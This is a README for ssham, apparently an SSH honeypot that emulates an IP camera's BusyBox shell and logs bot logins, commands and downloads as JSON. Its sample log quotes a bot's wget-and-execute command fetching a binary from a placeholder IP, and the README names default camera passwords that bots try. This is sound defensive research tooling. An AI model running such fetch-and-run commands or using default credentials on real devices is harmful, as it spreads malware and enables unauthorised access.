# ssham 🍯

A fake SSH server that catches bots.

![A bot logs in, downloads malware, and ssham records it all](.github/demo.gif)

Bots log in with the usual default passwords (`root`/`xc3511`, `admin`/`admin`, ...). They
get the BusyBox shell of a cheap IP camera, but nothing is real: every command is faked, files live in memory, and nothing
ever runs on your machine.

Meanwhile, ssham writes down everything they do.

## Run

```sh
go install github.com/antonmedv/ssham@latest
ssham -log ssham.jsonl
```

Try it:

```sh
ssh -p 2222 root@localhost
```

## What you see

One JSON object per line (trimmed here):

```json
{"msg":"auth","user":"root","method":"password","success":true,"password":"xc3511"}
{"msg":"input","line":"cd /tmp; wget http://203.0.113.7/bot.arm7; chmod +x bot.arm7; ./bot.arm7"}
{"msg":"download","tool":"wget","url":"http://203.0.113.7/bot.arm7","dest":"bot.arm7"}
```

The bot's `wget` hangs, then times out: the camera can't reach the internet. You have the URL.

If a bot drops an ARM binary another way, say with `echo -ne`, running it gives
`Segmentation fault`. You get the file's CPU type and SHA-256.

## Events

| `msg`                           | When                                                                  |
|---------------------------------|-----------------------------------------------------------------------|
| `connect`, `disconnect`         | A TCP connection opens or closes.                                     |
| `auth`                          | Every login attempt: the password, or the public key offered.         |
| `session_start`, `session_end`  | A shell or command starts or ends. Terminal, env, exit code.          |
| `input`                         | Every command line, typed or sent as `ssh host 'command'`.            |
| `stdin`                         | A line read by a running command, such as `cat` or `read`.            |
| `download`                      | `wget` or `tftp`: the URL and the file name.                          |
| `exec_binary`                   | A dropped binary is run: path, CPU type, size, SHA-256.               |
| `exec_script`                   | A script file is run, with its text.                                  |
| `exec_inline`                   | Code run with `sh -c` or piped into a shell.                          |
| `password_change`               | `passwd` or `chpasswd`, with the new password.                        |
| `forward`                       | A port forwarding request (`-L`, `-D`, `-R`). Nothing is connected.   |
| `archive_extract`, `reboot`     | `tar x`, and `reboot`, `halt` or `poweroff`.                          |

Every event also has `time`, `session` and `remote` (the bot's address).

## Is it safe?

ssham never runs a command and never connects anywhere. The shell, the files and the
network are fake and live in memory. A bot can't reach your machine or use it to attack
others.

The Docker setup in [DEPLOY.md](DEPLOY.md) also locks the container down: a non-root user,
a read-only filesystem, no capabilities, and memory and CPU limits.

## Catch real bots

Run it on port 22 with Docker: [DEPLOY.md](DEPLOY.md).

## Contributing

Adding a fake command is one small Go file. See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

[MIT](LICENSE)
